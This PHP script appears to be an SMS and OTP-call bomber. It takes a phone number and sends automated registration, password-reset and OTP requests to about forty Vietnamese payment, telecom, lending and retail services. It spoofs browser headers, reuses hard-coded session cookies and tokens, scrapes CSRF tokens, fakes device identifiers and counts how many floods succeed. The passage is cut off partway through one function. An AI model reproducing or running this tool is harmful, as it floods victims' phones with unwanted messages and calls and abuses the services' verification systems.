<?php
error_reporting(0);
session_start();
header('content-type: application/json');
if(isset($_GET)){
	$sdt = $_GET["phone"];
} else if(isset($_POST)){
	$sdt = $_POST["phone"];
} else {
	echo json_encode(array("status" => "error", "msg" => "VUI LÒNG REQUESTS CÓ MAIL"), JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT); exit;
}
if(strlen($sdt) < 10){
	$array = array(
		"trangthai" => "loi",
		"msg" => "Vui Lòng Nhập Đúng Số Điện Thoại"
	);
	echo json_encode($array, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT); exit;
} else if(!$sdt){
	$array = array(
		"trangthai" => "loi",
		"msg" => "Vui Lòng Nhập Đúng Số Điện Thoại"
	);
	echo json_encode($array, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT); exit;
} else if($sdt == "0" or $sdt == "1"){
  $array = array(
		"status" => "error",
		"msg" => "Số Admin Spam Cdmm Sv"
	);
	echo json_encode($array, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT); exit;
	}
///Calll Otp
$MONEYVEO = MONEYVEO($sdt);/// otp callllll
$ROBOCASH = ROBOCASH($sdt);/// otp callllll//
$DONGPLUS = DONGPLUS($sdt);///otp call
$TIENOI = TIENOI($sdt);//otp call
$MOMO = MOMO($sdt);//otp call
$ITAPHOA = ITAPHOA($sdt);
$SRC8BET = SRC8BET($sdt);
$VAMO = VAMO($sdt);
###Send Otp Sms
$FPTSHOP = FPTSHOP($sdt);//send otp
$FPT = FPT($sdt);
$SENMO = SENMO($sdt);
$VAYVND = VAYVND($sdt);///send otp/////////
$LOSHIP = LOSHIP($sdt);//send otp
$TUOITRE = TUOITRE($sdt);///send otp
$VIEON = VIEON($sdt);//send otp
$F88 = F88($sdt);//send otp
$TAMO = TAMO($sdt);///send otp
$VIETTELL = VIETTELL($sdt);///send otp
$VETTELL2 = VETTELL2($sdt);//send otp
$ZALOPAY = ZALOPAY($sdt);//send otp
$WINMART = WINMART($sdt);
$META = META($sdt);///send otp
$VTPAY = VTPAY($sdt);///send otp
$TV360 = TV360($sdt);//send otp
$POPS = POPS($sdt);//send otp
$VAYSIEUDE = VAYSIEUDE($sdt);///send otp
$THANTAIOI = THANTAIOI($sdt);///otp call
$MCREDIT = MCREDIT($sdt);///send otp
$CAYDENTHAN = CAYDENTHAN($sdt);//otp call
$DAIHOCFPT = DAIHOCFPT($sdt);///send otp
$CAFELAND = CAFELAND($sdt);
$FINDO = FINDO($sdt);
$ONCREDIT = ONCREDIT($sdt);
$CONCUNG = CONCUNG($sdt);
$UBO = UBO($sdt);
$SAPO = SAPO($sdt);
$POPEYS = POPEYS($sdt);
$PHARMACITY = PHARMACITY($sdt);
$MIOTO = MIOTO($sdt);
$KILO = KILO($sdt);
$INTERLOAD = INTERLOAD($sdt);
#dem ======
if($MONEYVEO["MONEYVEO"] == "Thành Công"){$success++;}else{$error++;}
if($ROBOCASH["ROBOCASH"] == "Thành Công"){$success++;}else{$error++;}
if($DONGPLUS["DONGPLUS"] == "Thành Công"){$success++;}else{$error++;}
if($TIENOI["TIENOI"] == "Thành Công"){$success++;}else{$error++;}
if($MOMO["MOMO"] == "Thành Công"){$success++;}else{$error++;}
if($ITAPHOA["ITAPHOA"] == "Thành Công"){$success++;}else{$error++;}
if($SRC8BET["SRC8BET"] == "Thành Công"){$success++;}else{$error++;}
if($VAMO["VAMO"] == "Thành Công"){$success++;}else{$error++;}
if($FPT["FPT"] == "Thành Công"){$success++;}else{$error++;}
if($SENMO["SENMO"] == "Thành Công"){$success++;}else{$error++;}
if($VAYVND["VAYVND"] == "Thành Công"){$success++;}else{$error++;}
if($LOSHIP["LOSHIP"] == "Thành Công"){$success++;}else{$error++;}
if($TUOITRE["TUOITRE"] == "Thành Công"){$success++;}else{$error++;}
if($VIEON["VIEON"] == "Thành Công"){$success++;}else{$error++;}
if($F88["F88"] == "Thành Công"){$success++;}else{$error++;}
if($TAMO["TAMO"] == "Thành Công"){$success++;}else{$error++;}
if($VIETTELL["VIETTELL"] == "Thành Công"){$success++;}else{$error++;}
if($VETTELL2["VETTELL2"] == "Thành Công"){$success++;}else{$error++;}
if($ZALOPAY["ZALOPAY"] == "Thành Công"){$success++;}else{$error++;}
if($WINMART["WINMART"] == "Thành Công"){$success++;}else{$error++;}
if($META["META"] == "Thành Công"){$success++;}else{$error++;}
if($VTPAY["VTPAY"] == "Thành Công"){$success++;}else{$error++;}
if($FPTSHOP["FPTSHOP"] == "Thành Công"){$success++;}else{$error++;}
if($TV360["TV360"] == "Thành Công"){$success++;}else{$error++;}
if($POPS["POPS"] == "Thành Công"){$success++;}else{$error++;}
if($VAYSIEUDE["VAYSIEUDE"] == "Thành Công"){$success++;}else{$error++;}
if($THANTAIOI["THANTAIOI"] == "Thành Công"){$success++;}else{$error++;}
if($MCREDIT["MCREDIT"] == "Thành Công"){$success++;}else{$error++;}
if($CAYDENTHAN["DENTHAN"] == "Thành Công"){$success++;}else{$error++;}
if($DAIHOCFPT["DAIHOCFPT"] == "Thành Công"){$success++;}else{$error++;}
if($CAFELAND["CAFELAND"] == "Thành Công"){$success++;}else{$error++;}
if($FINDO["FINDO"] == "Thành Công"){$success++;}else{$error++;}
if($ONCREDIT["ONCREDIT"] == "Thành Công"){$success++;}else{$error++;}
if($CONCUNG["CONCUNG"] == "Thành Công"){$success++;}else{$error++;}
if($UBO["UBO"] == "Thành Công"){$success++;}else{$error++;}
if($POPEYS["POPEYS"] == "Thành Công"){$success++;}else{$error++;}
if($PHARMACITY["PHARMACITY"] == "Thành Công"){$success++;}else{$error++;}
if($MIOTO["MIOTO"] == "Thành Công"){$success++;}else{$error++;}
if($KILO["KILO"] == "Thành Công"){$success++;}else{$error++;}
if($INTERLOAD["INTERLOAD"] == "Thành Công"){$success++;}else{$error++;}
$array = array(
	"MONEYVEO" => $MONEYVEO["MONEYVEO"],
	"ROBOCASH" => $ROBOCASH["ROBOCASH"],
	"DONGPLUS" => $DONGPLUS["DONGPLUS"],
	"TIENOI" => $TIENOI["TIENOI"],
	"MOMO" => $MOMO["MOMO"],
	"ITAPHOA" => $ITAPHOA["ITAPHOA"],
	#===============
	"VAYVND" => $VAYVND["VAYVND"],
	"LOSHIP" => $LOSHIP["LOSHIP"],
	"TUOITRE" => $TUOITRE["TUOITRE"],
	"VIEON" => $VIEON["VIEON"],
	"F88" => $F88["F88"],
	"TAMO" => $TAMO["TAMO"],
	"VIETTELL" => $VIETTELL["VIETTELL"],
	"VT2" => $VETTELL2["VETTELL2"],
	"ZALOPAY" => $ZALOPAY["ZALOPAY"],
	"WINMART" => $WINMART["WINMART"],
	"META" => $META["META"],
	"FPTSHOP" => $FPTSHOP["FPTSHOP"],
	"TV360" => $TV360["TV360"],
	"CAYDENTHAN" => $CAYDENTHAN["DENTHAN"],
	"ONCREDIT" => $ONCREDIT["ONCREDIT"],
	"DAIHOCFPT" => $DAIHOCFPT["DAIHOCFPT"],
	"CAFELAND" => $CAFELAND["CAFELAND"],
	"VIETTELLPAY" => $VTPAY["VTPAY"],
	"VAYSIEUDE" => $VAYSIEUDE["VAYSIEUDE"],
	"MCREDIT" => $MCREDIT["MCREDIT"],
	"FINDO" => $FINDO["FINDO"],
	"POPS" => $POPS["POPS"],
	"CONCUNG" => $CONCUNG["CONCUNG"],
	"THANTAIOI" => $THANTAIOI["THANTAIOI"],
	"UBO" => $UBO["UBO"],
	"SAPO" => $SAPO["SAPO"],
	"POPEYS" => $POPEYS["POPEYS"],
	"PHARMACITY" => $PHARMACITY["PHARMACITY"],
	"MIOTO" => $MIOTO["MIOTO"],
	"KILO" => $KILO["KILO"],
	"SRC8BET" => $SRC8BET["SRC8BET"],
	"FPT" => $FPT["FPT"],
	"VAMO" => $VAMO["VAMO"],
	"SENMO" => $SENMO["SENMO"],
	"INTERLOAD" => $INTERLOAD["INTERLOAD"]
);
$data = array(
	"STATUS" => 200,
	"INFO" => "https://www.facebook.com/vothanhtrungggg",
	"DATA" => $array,
  "Tong" => "41",
  "thanhcong" => $success,
	"loi" => $error
);
echo json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT); 















#####FUNCTION#######
function MONEYVEO($sdt){
	$head = array(
		"Host: moneyveo.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"traceparent: 00-".generateRandomString(strlen("c771ff34b940c30df615b678478fce28"))."-".generateRandomString(strlen("1e0ba42c6725b148"))."-00",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"referer: https://moneyveo.vn/vi/registernew/",
	);
	$get = CURL("GET", "https://moneyveo.vn/vi/registernew/", null, $head, true);
	$ck = explode(";", explode("set-cookie: ", $get)[1])[0].";";
	$data = 'phoneNumber='.$sdt;
	$head = array(
		"Host: moneyveo.vn",
		"accept: */*",
		"x-requested-with: XMLHttpRequest",
		"traceparent: 00-".generateRandomString(strlen("c771ff34b940c30df615b678478fce28"))."-".generateRandomString(strlen("1e0ba42c6725b148"))."-00",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/x-www-form-urlencoded; charset=UTF-8",
		"referer: https://moneyveo.vn/vi/registernew/",
		"cookie: ".$ck
	);
	$access = json(CURL("POST", "https://moneyveo.vn/vi/registernew/sendsmsjson/", $data, $head, false));
	if($access["succeed"] == "true" or $GET["succeed"] == 1){
		return array("MONEYVEO" => "Thành Công");
	} else {
		return array("MONEYVEO" => "Thất Bại");
	}
}
function ROBOCASH($sdt){
	$head = array(
		"Host: robocash.vn",
		"cache-control: max-age=0",
		"upgrade-insecure-requests: 1",
		"origin: https://robocash.vn",
		"content-type: application/x-www-form-urlencoded",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
		"referer: https://robocash.vn/?utm_source=seo&utm_term=https://robocash.vn/vay-tien-nhanh",
		"cookie: __cfruid=96b1c440a99f8a9b4500db9003fba029530f7efd-1681472457;_fbp=fb.1.1681472466567.1755259407;ec_png_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_etag_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_cache_utm=7df928dd-d32f-9b30-de56-3fdc350de09b;uid=7df928dd-d32f-9b30-de56-3fdc350de09b;ec_png_client=false;ec_etag_client=false;ec_cache_client=false;client=false;ec_png_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;ec_etag_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;ec_cache_client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;client_utm=%7B%22utm_source%22%3A%22seo%22%2C%22utm_term%22%3A%22https%3A%5C%2F%5C%2Frobocash.vn%5C%2Fvay-tien-nhanh%22%2C%22referer%22%3Anull%7D;XSRF-TOKEN=eyJpdiI6IjF3ZS9oVzgzNm44dERDZTZvc05ubVE9PSIsInZhbHVlIjoiM0FrclFqU1V2RDVrMFdlOUFoNmlQUzN4c1U4SWVUWFViUm41cDcyWWkyQ0VaaWg2WUtMQVVDZm9nNlQyNWV4dHhTME45QTdNdlFwZ2t4R0ZLWFd6RXJRKzNkSE9WOTV2SE1NWlhneGw0RXl1Q3M4SWZaR1RuUGJtVlBhVzhMTnIiLCJtYWMiOiJlNjE2YTZhNGYyN2VlZTA0YjU2NGIwYjlhOTAxZjUyM2E3Y2NhZDkwZTRjZTRlOWFkNWNlNDZiODQ3YjM2ZWIyIiwidGFnIjoiIn0%3D;sessionid=eyJpdiI6IjRGN1A0UEJFRE8wbTRqUlNrdzhKWUE9PSIsInZhbHVlIjoieXNzOEIrbXMxR0l4R0FSZGtSN1hBUnduUy94ak1jQzhZdEViUGdhTkNKWG1aVThqd1NzY0pVVGhvRjk2L0RpNk40UEZZcnhESU12U3U5bGRGdnVSN1JPYzNHZUpYRUg2RDlvajh6MGNINVB2MEdDWDBXeXZOYzcveXFBMHF5OUciLCJtYWMiOiJkYTNiM2U4ZGQ2NDdjNTA3MGE5Y2RhOGQ2YTkwNTU4YjI4MTI0MDA0MDRkYWY5MTA4MmQzMWQ1ZTcxMzc5MjQxIiwidGFnIjoiIn0%3D;utm_uid=eyJpdiI6ImF4cTdnZGsyNVNGemtpTDJ0N05oR0E9PSIsInZhbHVlIjoicWo5eG1YRUIrSzhHeVE4L0hKYlBBN0k4bnpKaDNQcTk3cEVQNmNjZTgrMWN0ejQ3bk9kbW1Ndkl4dEd5R2JSZW02cmtjRlpmN3V2Y1p3clVzek1qUmN6RHRCam5ybkljRG81R0NZNzREVFNKUkFYM0hiM1VsbGEySVFDczBROWYiLCJtYWMiOiJhZTQzZmNlYjEzYmMzN2Q3ZWUxNjQ1NDM1Y2ZlOGU5OTVlODJlYzg1MjVlNjViN2Y2NWM2M2I4ZjVkNzE4ZTkwIiwidGFnIjoiIn0%3D"
	);
	$GET = CURL("GET", "https://robocash.vn/?utm_source=seo&utm_term=https://robocash.vn/vay-tien-nhanh", null, $head, false);
	$token = explode('"', explode('name="_token" value="', $GET)[1])[0];
	$data = "_token=".$token."&_token=".$token."&amount=5+000+000&term=14&phone=".$sdt;
	$GET = CURL("POST", "https://robocash.vn/guest/application/create", $data, $head, false);
	if (strpos ($GET, 'class="login">Đăng nhập') !== false){
		return array("ROBOCASH" => "Thành Công");
	} else {
		return array("ROBOCASH" => "Thất Bại");
	}
}
function DONGPLUS($sdt){
	$sdt = "84". $sdt;
	$sdt = explode("840", $sdt)[1];
	$head = array(
		"Host: api.dongplus.vn",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://dongplus.vn",
		"referer: https://dongplusvn/user/login",
	);
	$data = '{"full_name":"Khang Nguyễn","first_name":"Nguyễn","last_name":"Khang","mobile_phone":"84'.$sdt.'","target_url":"https://dongplus.vn/?utm_source=direct&utm_medium=direct&utm_campaign=direct"}';
	CURL("POST", "https://api.dongplus.vn/api/user", $data, $head, false);
	$data = '{"phone":"84'.$sdt.'"}';
	$access = CURL("POST", "https://api.dongplus.vn/api/user/send-one-time-password", $data, $head, false);
	if(json_decode($access,true)["loan_processing_enabled"] == ""){
		return array("DONGPLUS" => "Thành Công");
	} else {
		return array("DONGPLUS" => "Thất Bại");
	}
}
function TIENOI($sdt){
	$head = array(
		"Host: app.tienoi.com.vn",
		"accept: application/json, text/plain, */*",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://app.tienoi.com.vn",
		"referer: https://app.tienoi.com.vn/auth/registration?need=2000000&days=14",
	);
	$data = '{"mobilePhone":"'.$sdt.'","password":"A123456789a","passwordConfirmation":"A123456789a","isVoiceSms":true}';
	$access = CURL("POST", "https://app.tienoi.com.vn/portal/api/v1/public/signUp/sendAcceptanceCode", $data, $head, false);
	if(json($access)["id"]){
		return array("TIENOI" => "Thất Bại");
	} else {
		return array("TIENOI" => "Thành Công");
	}
}
function MOMO($sdt){
	$imei = generateImei();
	$sec = get_SECUREID();
	$token = get_TOKEN();
	$rkey = generateRandom(20);
	$aaid = generateImei();
	$microtime = get_microtime();
	$head = array(
		"agent_id: undefined",
		"sessionkey:",
		"user_phone: undefined",
		"authorization: Bearer undefined",
		"msgtype: CHECK_USER_BE_MSG",
		"Host: api.momo.vn",
		"User-Agent: okhttp/4.0.12",
		"app_version: 40122",
		"app_code: 4.0.12",
		"device_os: ANDROID"
	);
	$data = array (
		'user' => $sdt,
		'msgType' => 'CHECK_USER_BE_MSG',
		'cmdId' => (string) $microtime. '000000',
		'lang' => 'vi',
		'time' => $microtime,
		'channel' => 'APP',
		'appVer' => '40122',
		'appCode' => '4.0.12',
		'deviceOS' => 'ANDROID',
		'buildNumber' => 0,
		'appId' => 'vn.momo.platform',
		'result' => true,
		'errorCode' => 0,
		'errorDesc' => '',
		'momoMsg' => 
		array (
			'_class' => 'mservice.backend.entity.msg.RegDeviceMsg',
			'number' => $sdt,
			'imei' => $imei,
			'cname' => 'Vietnam',
			'ccode' => '084',
			'device' => "Oppo realme X Lite",
			'firmware' => '23',
			'hardware' => "RMX1851CN",
			'manufacture' => "Oppo",
			'csp' => '',
			'icc' => '',
			'mcc' => '452',
			'device_os' => 'Android',
			'secure_id' => $sec,
		),
		'extra' => array (
			'checkSum' => '',
		),
	);
	$GET = CURL("POST", "https://api.momo.vn/backend/auth-app/public/CHECK_USER_BE_MSG", json_encode($data), $head, false);
	$head = array(
		"agent_id: undefined",
		"sessionkey:",
		"user_phone: undefined",
		"authorization: Bearer undefined",
		"msgtype: SEND_OTP_MSG",
		"Host: api.momo.vn",
		"User-Agent: okhttp/4.0.12",
		"app_version: 40122",
		"app_code: 4.0.12",
		"device_os: ANDROID"
	);
	$data = array (
		'user' => $sdt,
		'msgType' => 'SEND_OTP_MSG',
		'cmdId' => (string) $microtime. '000000',
		'lang' => 'vi',
		'time' => $microtime,
		'channel' => 'APP',
		'appVer' => '40122',
		'appCode' => '4.0.12',
		'deviceOS' => 'ANDROID',
		'buildNumber' => 0,
		'appId' => 'vn.momo.platform',
		'result' => true,
		'errorCode' => 0,
		'errorDesc' => '',
		'momoMsg' => 
		array (
			'_class' => 'mservice.backend.entity.msg.RegDeviceMsg',
			'number' => $sdt,
			'imei' => $imei,
			'cname' => 'Vietnam',
			'ccode' => '084',
			'device' => "Galaxy A21s",
			'firmware' => '23',
			'hardware' => "SM-A217F/DS",
			'manufacture' => "Samsung",
			'csp' => '',
			'icc' => '',
			'mcc' => '452',
			'device_os' => 'Android',
			'secure_id' => $sec,
		),
		'extra' => 
		array (
			'action' => 'SEND',
			'rkey' => $rkey,
			'AAID' => $aaid,
			'IDFA' => '',
			'TOKEN' => $token,
			'SIMULATOR' => '',
			'SECUREID' => $sec,
			'MODELID' => "Oppo RMX1851",
			'isVoice' => false,
			'REQUIRE_HASH_STRING_OTP' => true,
			'checkSum' => '',
		),
	);
	$GET = json(CURL("POST", "https://api.momo.vn/backend/otp-app/public/", json_encode($data), $head, false));
	if($GET["errorDesc"] == "Thành công"){
		return array(
			"MOMO" => "Thành Công"
		);
	} else {
		return array(
			"MOMO" => "Thất Bại"
		);
	}
}
function VAYVND($sdt){
	$head = array(
		"Host: api.vayvnd.vn",
		"accept: application/json",
		"accept-language: vi",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"origin: https://vayvnd.vn",
		"referer: https://vayvnd.vn/",
	);
	$data = '{
  "phone": "'.$sdt.'",
  "utm_campaign": "null",
  "cpa_id": 7,
  "cpa_lead_data": {
    "click_id": "'.generateImei().'",
    "source_id": "source_6",
    "utm_score": "0.0'.generateRandomstr(strlen("13672266155481339")).'"
  },
  "utm_list": [
    {
      "utm_source": "jeffapp"
    }
  ],
  "source_site": 1,
  "reg_screen_resolution": {
    "width": 412,
    "height": 915
  }
}';
	$GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users", $data, $head, false));
	if($GET["data"]["id"]){
		return array("VAYVND" => "Thành Công");
	} else {
		$data = '{"login":"'.$sdt.'"}';
		$GET = json(CURL("POST", "https://api.vayvnd.vn/v1/users/password-reset", $data, $head, false));
		if($GET["result"] == 1 or $GET["result"] == "true") {
			return array("VAYVND" => "Thành Công");
		} else {
			return array("VAYVND" => "Thất Bại");
		}
	}
}
function LOSHIP($sdt){
	$a = "84". $sdt;
	$usersdt = explode("840", $a)[1];
	$head = array(
		"Host: latte.lozi.vn",
		"accept-language: vi_VN",
		"x-access-token: unknown",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: application/json",
		"accept: */*",
		"origin: https://loship.vn",
		"referer: https://loship.vn/",
	);
	$data = '{"device":"Android 12","platform":"Chrome WebView/96.0.4664.104","countryCode":"84","phoneNumber":"'.$sdt.'"}';
	$GET = CURL("POST", "https://latte.lozi.vn/v1.2/auth/register/phone/initial", $data, $head,false);
	if (strpos ($GET, $usersdt) !== false){
		return array("LOSHIP" => "Thành Công");
	} else {
		return array("LOSHIP" => "Thất Bại");
	}
}
function TUOITRE($sdt){
	$head = array(
		"Host: tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$get = CURL("GET", "https://tuoitre.vn", null, $head, false);
	$token_a = explode("'", explode("VideoToken: '", $get)[1])[0];
	$head = array(
		"Host: sso.tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"sec-fetch-site: same-origin",
		"sec-fetch-mode: cors",
		"sec-fetch-dest: empty",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$get = CURL("GET", "https://sso.tuoitre.vn/otp?redirectUrl=https://tuoitre.vn/&state=eyJ".$token_a, null, $head, false);
	$token_b = explode('"', explode('name="csrf-token" content="', $get)[1])[0];
	$head = array(
		"Host: sso.tuoitre.vn",
		"accept: application/json, text/plain, */*",
		"x-xsrf-token: eyJ".$token_a,
		"x-csrf-token: ".$token_b,
		"x-requested-with: XMLHttpRequest",
		"user-agent: Mozilla/5.0 (Linux; Android 12; SM-A217F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",
		"content-type: multipart/form-data; boundary=----WebKitFormBoundary6tasV7gdCXo1XomC",
		"origin: https://sso.tuoitre.vn",
		"referer: https://sso.tuoitre.vn/otp?redirectUrl=https%3A%2F%2Ftuoitre.vn%2Fvay-tien-qua-app-qua-nhanh-qua-nguy-hiem-20190703082332659.htm&state=eyJpdiI6IlU5Y1p0Y3NpVTBtdkF5K29zNHM2SGc9PSIsInZhbHVlIjoiRVN6TjlscXZ4SmtCUW5WYkdoM1M2emJWc216Q1RrQlNFK1FWR3dXTC9DSDdBQ3gwa3FuYmQ1YlBjQlFzMXYvSHo3cHIvaHFScWZtMUZPV284S3JqalhCRzZNNDFIb2EyVldYd3VYZ2pleHJHTzR3bVhEb2pxRGtua2s4bHFNcS90YjlaL09URWVUSG5uQnJSREhNNUlRalAyVG05c2E5dVFTUWE0aG9Tb21lNytFVnVuVWxwQ1ZzNEFsVVdhbTNhcVlaL3ZZVm10Rzczc2xwWWV5eDFjcks5dDBSM3FNczAzNi8yb09YM2lBQ2F2eXN6UHVhTnFoUXNjNTFhaUQyeS9HNmpLQ2crcFh6WDQzTTFsa2R6R04rY1QyYmpvOFBtNDAvZ2w0amVKVWk0bEtNQzlnQUFBaFFIRFQ3REdjR2pMNjI1TG4ycTVmK3E4T004MmgweXE2TFNUSEZYMTRwWEF1VnFtUzBMeG9iTHVaTVd4MEVWUUpGRFAxbkVlMC9XIiwibWFjIjoiNjVjMThmNGY4YjYyMzdlNGZkNDA2NTlmMzVkZTQ2MjgwNzUyOTc3YWE4NzBmZjE5YTQxY2Y2NTQ4NTA4YTQwZiIsInRhZyI6IiJ9",
		"cookie: _ttsid=2585aa59f50b946ccae21ac9ec87353395a8893412ea53150a8e6dc0d1c15841;XSRF-TOKEN=eyJpdiI6IldLQ3J0bkp6bVJUWk4yajBkd1RQZkE9PSIsInZhbHVlIjoiclUwb25DWW5YNmFmbXpqMDJZVjBpcHVGZVdOdmdQeG9sZ0tUd3dMUjc4L3RWNkd3NGdaNzMvVFRMTlQwcm5kZ3B6TGZYS3R4SlNvQVlXcksyR3JISUl0R3VwYzZCOFY5Q242akFmL1hSTXhpTEx1OWpQeXlTY01jOFR1bzlES08iLCJtYWMiOiJlMTNjMDk2MWRhMDZlNDJjMjAyZTg2MWI1N2Y0NzljNDQ3MGM0YjQ2ZTEzMGVkMzFiNjBhNjZiNWU2MjIwYjc5IiwidGFnIjoiIn0%3D;SSO_SID=eyJpdiI6ImFHK0NycmxqYVRPV0lDUXZYTSttdkE9PSIsInZhbHVlIjoiTm5TMDNJVlVMdGxYelBWNWlzSFNselhsTG9RV1BYRWNvWXpHVjE4djJsTWlxS2d2dmF6Zk1EZGlCekVTbzRNc2xSclc5MmJvVkVGRWp4aUpjMUFjQ2lVRWNBRVhHbkdmTzdTQzRPTlp6clF6eUczNGk0Y2xHRkEwaXhUbitTbk8iLCJtYWMiOiJhNjNjYjlmNTA1YjNmYmJiMDJkMjMyZmFkOGE2NzYyMTQ3NzY4ZmNiYzA5MDg4M2ExZmYxNWZlMzY0ZjM2NGU3IiwidGFnIjoiIn0%3D"
	);
	$data = '------WebKitFormBoundary6tasV7gdCXo1XomC
Content-Disposition: form-data; name="phone"

